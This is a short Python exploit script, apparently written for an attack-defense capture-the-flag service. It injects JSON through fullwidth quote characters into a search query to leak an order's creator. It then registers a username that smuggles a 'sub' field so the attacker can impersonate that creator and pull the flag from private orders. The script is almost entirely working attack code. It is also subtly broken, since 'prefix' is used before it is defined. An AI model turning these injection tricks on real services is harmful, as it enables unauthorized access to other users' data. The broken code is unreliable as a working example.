import requests
import random
import string
import json
import re

letters = string.ascii_lowercase

public_flag_id = "5eafae42ee77462388b5f208a0f916db" # PUT here your public flag id


phase_1_payload = "*＂}},{＂has_child＂:{＂type＂:＂order＂,＂query＂:{＂term＂:{＂text＂:＂" + public_flag_id + "＂}},＂score_mode＂:＂min"
login = ''.join(random.choice(letters) for i in range(10))
password = ''.join(random.choice(letters) for i in range(10))
s = requests.session()
s.post("http://127.0.0.1/Users/register", json={"login": login, "password": password})
s.post("http://127.0.0.1/Users/login", json={"login": login, "password": password})
print("whoami: " + s.get("http://127.0.0.1/Users/whoami").text)

products = json.loads(s.get("http://127.0.0.1/api/Products/search?query="+phase_1_payload).text)
creator = products[0]["creator"]
print("got product creator: " + creator)



phase_2_payload = prefix + "＂,＂sub＂:＂" + creator
prefix = ''.join(random.choice(letters) for i in range(10))
s.post("http://127.0.0.1/Users/register", json={"login": phase_2_payload, "password": password})
s.post("http://127.0.0.1/Users/login", json={"login": phase_2_payload, "password": password})
print("whoami: " + s.get("http://127.0.0.1/Users/whoami").text)

result = json.loads(s.get("http://127.0.0.1/api/Orders/search?query="+public_flag_id).text)
flag = re.findall(r"\w{31}=", result[0]["description"])
print("FLAG:", flag)
